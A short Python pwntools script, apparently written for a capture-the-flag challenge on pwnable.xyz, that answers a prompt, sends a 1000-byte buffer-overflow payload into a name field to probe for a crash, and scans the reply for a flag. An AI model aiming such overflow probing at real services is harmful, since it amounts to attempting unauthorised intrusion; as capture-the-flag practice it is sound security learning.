#!/usr/bin/env python3

from pwn import *

conn = remote('svc.pwnable.xyz', 30004)

conn.recvuntil(b'[y/N]: ')
conn.sendline(b'y')

conn.recvuntil(b'Name: ')

# Overflow masivo para ver si crashea y revela algo
payload = b'A' * 1000

conn.sendline(payload)

# Recibir TODO
data = conn.recvall(timeout=5)
log.info(f"Respuesta:\n{data}")

if b'FLAG{' in data:
    start = data.find(b'FLAG{')
    end = data.find(b'}', start) + 1
    flag = data[start:end]
    log.success(f"FLAG: {flag.decode()}")

conn.close()